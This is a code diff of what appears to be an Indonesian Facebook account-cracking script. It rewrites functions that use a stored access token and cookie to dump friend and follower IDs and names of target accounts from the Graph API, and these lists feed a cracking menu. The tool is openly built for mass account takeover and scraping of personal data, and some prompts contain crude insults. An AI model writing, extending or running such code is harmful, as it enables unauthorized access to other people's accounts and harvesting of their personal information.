@@ -226,7 +226,7 @@ def menu(my_name,my_id):
 	print(x+'['+h+'•'+x+'] ACTIVE USER : '+str(my_name))
 	print(x+'['+h+'•'+x+'] USER ID     : '+str(my_id))
 	print(x+'['+h+'•'+x+'] IP ADDRESS  : '+str(sh['origin']))
-	io = '''[bold cyan][01] Crack Publik	              [05] CRACK FROM FILES	                             
+	io = '''[bold cyan][01] Crack Publik	             [05] CRACK FROM FILES	                             
 [02] Crack Pengikut		     [06] Check Opsi CP
 [03] Crack Like Post	             [07] Check Hasil Crack
 [04] Crack Gruop                     [08] Crack Tips
@@ -454,73 +454,30 @@ def file():
 				time.sleep(2)
 				back()
 
-# DUMP ID PUBLIK
-def dump_publik():
-	try:
-		token = open('.token.txt','r').read()
-	except IOError:
-		exit()
-	win = '# DUMP PUBLIC ID'
-	win2 = mark(win, style='green')
-	sol().print(win2)
-	print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
-	pil = input(x+'['+p+'f'+x+'] INPUT TARGET ID : ')
-	try:
-		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
-		for pi in koh2['friends']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
-			except:continue
-		print(x+'['+h+'•'+x+'] TOTAL : '+str(len(id)))
-		setting()
-	except requests.exceptions.ConnectionError:
-		li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-		lo = mark(li, style='red')
-		sol().print(lo, style='cyan')
-		exit()
-	except (KeyError,IOError):
-		teks = '# NOT PUBLIC FRIENDSHIP OR BROKEN TOKEN'
-		teks2 = mark(teks, style='red')
-		sol().print(teks2)
-		exit()
-
 # DUMP ID MASSAL
 def dump_massal():
-	mas='[01] BULK CRACK FROM FILES\n[02] MANUAL BULK CRACK'
-	mas2=nel(mas,style='cyan')
-	cetak(nel(mas2,title=' • BULK MENU •'))
-	pilih=input('[•] Choose : ')
-	if pilih in ['1','01']:
-		nmfil=input('[•] File Name : ')
-		nmfile=open(nmfil,'r').read().splitlines()
-		for xfil in nmfile:
-			uid.append(xfil)
-	elif pilih in ['2','02']:
-		print(x+'['+h+'•'+x+'] ENTER TOTAL ID LIMIT [20]')
-		try:
-			jum = int(input(x+'['+p+'f'+x+'] Number Of Id : '))
-		except ValueError:
-			pesan = '# THE INPUT YOU ENTER IS NOT A NUMBERS'
-			pesan2 = mark(pesan, style='red')
-			sol().print(pesan2)
-			exit()
-		if jum<1 or jum>20:
-			pesan = '# OUT OF RANGE MEN'
-			pesan2 = mark(pesan, style='red')
-			sol().print(pesan2)
-			exit()
-		ses=requests.Session()
-		yz = 0
-		print(x+'['+h+'•'+x+'] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDS')
-		for met in range(jum):
-			yz+=1
-			kl = input(x+'['+h+str(yz)+x+'] Enter The '+str(yz)+'Id : ')
-			uid.append(kl)
-	sed='# WAIT COLLECTING ID'
-	sol().print(mark(sed, style='green'))
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input(f'{N}├───[{H}+{N}] Mau Berapa Target Cui : {h}'))
+	except ValueError:
+		print(f'{N}├───[{H}+{N}] Masukkan Angka Anjing, Malah Huruff ')
+		exit()
+	if jum<1 or jum>100:
+		print(f'{N}├───[{H}+{N}] Gagal Dump ID')
+		exit()
 	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f'{N}├───[{H}+{N}] Masukkan ID Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
 	for userr in uid:
 		try:
-			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cokbrut[0]}).json()
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
 			for mi in col['friends']['data']:
 				try:
 					iso = (mi['id']+'|'+mi['name'])
@@ -530,17 +487,41 @@ def dump_massal():
 		except (KeyError,IOError):
 			pass
 		except requests.exceptions.ConnectionError:
-			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
+			print(f'{N}├───[{H}+{N}] Sinyal Loh Kek Kontoll ')
 			exit()
-	tot = '# SUCCESSFUL COLLECTING  %s ID'%(len(id))
-	if len(id)==0:
-		tot2 = mark(tot, style='red')
-	else:
-		tot2 = mark(tot, style='green')
-	sol().print(tot2)
-	setting()
+	try:
+		print(f'{N}├───[{H}+{N}] Total ID Yang Terkumpul : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print(f'{N}├───[{H}+{N}] Sinyal Lo kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'{N}├───[{H}+{N}]{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
+#-------------------[ CRACK-PENGIKUT ]----------------#
+def dump_follower():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	print(f'{N}├───[{H}+{N}] Ketik ( {b}me {N}) Jika Ingin Crack Follower Sendiri ')
+	pil = input(f'{N}├───[{H}+{N}] Masukkan Idz Target : ')
+	try:
+		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
+		for pi in koh2['subscribers']['data']:
+			try:id.append(pi['id']+'|'+pi['name'])
+			except:continue
+		print(f'{N}├───[{H}+{N}] Total Idz :{h} '+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{N}├───[{H}+{N}] Koneksi Internet Bermasalah ')
+		exit()
+	except (KeyError,IOError):
+		print(f'{N}├───[{H}+{N}] Gagal Mengambil Target ')
+		exit()
 #DUMP PENGIKUT
 def dump_pengikut():
 	try:
